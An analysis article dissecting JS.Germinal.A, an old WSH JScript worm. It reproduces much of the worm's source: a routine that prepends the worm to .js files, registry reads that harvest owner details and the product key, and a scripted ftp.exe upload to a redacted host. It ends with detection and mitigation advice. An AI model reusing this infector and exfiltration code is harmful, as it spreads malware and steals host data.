# Dissecting JS.Germinal.A: A WSH JavaScript File‑Infector with FTP Exfiltration 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
JS.Germinal.A (June 2001) is a Windows Script Host (WSH) malware written in JScript (Microsoft’s JavaScript dialect). It blends a simple file‑infector that prepends itself to other `.js` files with a data collection routine that writes host details to a text file and attempts to upload it via the legacy command‑line FTP client. It does not exploit vulnerabilities; instead, it assumes WSH is enabled and that the user executes the script. The program uses the FileSystemObject and WScript.Shell automation interfaces to traverse directories, edit files, read registry values, and spawn external processes.

Studying this sample highlights recurring patterns of early 2000s script malware: prepend infection, marker checks to avoid re‑infecting, environment reconnaissance via the registry, and simple exfiltration through command‑line tooling. Its deterministic artifacts and strings make it suitable for retro hunting and for demonstrating defensive controls that blunt script‑borne threats.

## Overview of the Malware 🐛
JS.Germinal pursues two main objectives: spread to local JavaScript files and export basic host information.

- Local infection: Reads its own source and attempts to prepend that content to `.js` files under Windows, Windows\Desktop, and Windows\SAMPLES\WSH. A 19‑character signature (`// JS.Germinal.A@mm`) is used to detect prior infection.
- System tagging: Writes marker strings into `HKLM\Software\` and `HKCU\Software\` as crude authorship tags.
- Recon and exfiltration: Reads OS owner/organization IDs and version information from the registry, writes a summary to `C:\<Owner>.txt`, and then uses a scripted `ftp.exe` session to upload that text file to a remote host.
- Error handling and fragility: The code contains logic bugs (enumeration and parameter type issues) that may limit infection scope or cause runtime errors in some environments.

No persistence is configured, and there is no C2. The script executes once and exits after its routines complete.

## Source Code Analysis 🔬
The script is compact and splits into initialization, infection, tagging/telemetry, and FTP steps.

### Initialization: Self‑read and targets
```javascript
var WS = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var win = fso.GetSpecialFolder(0);
var c = fso.OpenTextFile(WScript.ScriptFullName, 1);
var virus = c.ReadAll();
```
- Uses WSH automation to access the shell and filesystem. `virus` holds the script’s entire source to support prepending into other files.

```javascript
var dossier = new Array();
dossier[0] = fso.GetFolder(".");
dossier[1] = win;
dossier[2] = win + "\\Desktop";
dossier[3] = win + "\\SAMPLES\\WSH";
for (i = 0; i < 4; i++) {
  infecte(dossier[i]);
}
```
- The target list mixes a Folder object (`GetFolder(".")`) with strings (paths). The `infecte` function calls `fso.GetFolder(dossier)`, which expects a path string; passing an actual Folder object at index 0 can raise a type error in JScript. There is no try/catch in this sample, so an error could abort execution depending on the host’s WSH settings.

### Prepender infection routine
```javascript
function infecte(dossier) {
  var notredossier = fso.GetFolder(dossier);
  var fichier = new Enumerator(notredossier.Files);
  if (fso.GetExtensionName(fichier.item()).toUpperCase() == "JS") {
    var victime = fso.OpenTextFile(fichier.item().path, 1);
    var marque = victime.Read(19);
    var victimecode = marque + victime.ReadAll();
    victime.Close();
    if (marque != "// JS.Germinal.A@mm") {
      var victime = fso.CreateTextFile(fichier.item().path, 2);
      victime.Write(virus + victimecode);
      victime.Close();
    }
  }
}
```
- Enumeration bug: The code never advances the enumerator (`fichier.moveNext()`), so it only inspects the first file in each folder. In many directories this results in at most a single file being processed.
- Marker logic: Reads the first 19 characters and compares to `// JS.Germinal.A@mm`. If unmatched, it rewrites the file as `[worm source] + [original file content]`, effectively prepending itself. The read of `marque + victime.ReadAll()` reconstitutes the original content; prepending retains original behavior after the worm executes when the `.js` is run under WSH.
- No subdirectory traversal: Only top‑level files in the listed directories are considered.

### System tagging and telemetry
```javascript
WS.RegWrite("HKLM\\Software\\", "JS.Germinal Par PetiK 02/05/2001");
WS.RegWrite("HKCU\\Software\\", "JS.Germinal Par PetiK 02/05/2001");

var nom  = WS.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner");
var org  = WS.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization");
var id   = WS.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId");
var key  = WS.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey");
var ver  = WS.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Version");
var vernum = WS.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\VersionNumber");
```
- Creates two marker values (default values at those keys) that can be used as IOCs. Then reads multiple identity and version strings from the registry, some of which may not exist on all Windows versions, leading to runtime errors if not guarded.

```javascript
var txt = fso.CreateTextFile("C:\\" + nom + ".txt", 2);
txt.WriteLine("Information de " + nom + " à " + org);
txt.WriteLine("");
txt.WriteLine("Numéro d'identification : " + id);
txt.WriteLine("Numéro de la clé : " + key);
txt.WriteLine("Version de windows : " + ver + " " + vernum);
txt.Close();
```
- Writes a plaintext report to the root of C: named after the RegisteredOwner. This is later uploaded.

### Scripted FTP exfiltration
```javascript
var drv = fso.CreateTextFile(win + "\\PetiK.drv", 2);
drv.WriteLine("open");
drv.WriteLine("<redacted-host>");
drv.WriteLine("<redacted-username>");
drv.WriteLine("ascii");
drv.WriteLine("put C:\\" + nom + ".txt");
drv.WriteLine("bye");
drv.WriteLine("exit");
drv.Close();

WS.Run("command.com /c ftp.exe -i -v -s:" + win + "\\PetiK.drv");
```
- The worm prepares a command script for `ftp.exe` and then runs the FTP client in scripted mode (`-s:`) to upload the text report. The original code includes a concrete host and username, which are redacted here for safety. No password is supplied in the sample; behavior may hang or prompt depending on FTP server configuration.
- Use of `command.com` suggests design for Windows 9x/ME; on NT‑class systems, `cmd.exe` would be more common, though `command.com` is still present for compatibility.

### Notable weaknesses and edge cases
- Enumerator handling means only a single file per directory is processed; infection does not recurse.
- Mixed argument types to `GetFolder` (object vs string) can throw.
- Lack of error handling in JScript (no try/catch) can terminate execution if registry keys are absent.

## Mitigation and Defense Strategies 🛡️
- Constrain WSH: Disable or restrict Windows Script Host (wscript.exe/cscript.exe) for standard users with AppLocker/WDAC. Where scripts are required, allow only signed scripts from trusted paths.
- Email and attachment filtering: Block or quarantine `.js` email attachments at gateways. Use content inspection to flag JScript referencing `WScript.Shell`, `Scripting.FileSystemObject`, or `ftp.exe -s`.
- IOC and string hunts: Search for JavaScript files beginning with `// JS.Germinal.A@mm` or containing that string near the top. Hunt for `C:\PetiK.drv` in Windows directories and for `C:\<Owner>.txt` files created by the malware.
- Registry monitoring: Alert on unexpected writes to `HKLM\Software\` and `HKCU\Software\` default values containing “JS.Germinal” and on mass reads from `HKLM\...\CurrentVersion` identity/version keys by `wscript.exe/cscript.exe`.
- Process and network telemetry: Detect `wscript.exe`/`cscript.exe` spawning `ftp.exe` with `-s:`. Block legacy FTP (port 21) egress where not needed; prefer secure transfer protocols and enforce outbound filtering.
- File integrity: Monitor Windows, Desktop, and WSH Samples directories for sequential modifications of `.js` files and sudden file size increases indicative of prepending.
- Least privilege: Running users without admin rights constrains writes to HKLM and Windows directories, reducing impact and improving detection fidelity.
- Recovery: Remove prepended worm content from infected `.js` files (restore from clean backups where feasible). Delete `C:\<Owner>.txt` and `PetiK.drv`. Review and revert any registry marker values. Rotate any exposed IDs/keys if applicable in your environment.

## Conclusion
JS.Germinal.A is a straightforward WSH JScript worm: it prepends its own source to local script files and attempts to exfiltrate host identity and OS details via a scripted FTP session. While fragile due to enumeration and typing bugs, its behaviors are noisy and leave clear markers—signatures in infected files, registry tags, staging files, and `ftp.exe` invocations. Modern controls that restrict WSH, filter script attachments, block legacy FTP, and monitor for characteristic strings and process chains render this class of malware low‑impact. For legacy systems, applying those controls and hunting for the IOCs outlined here enables quick containment and cleanup.
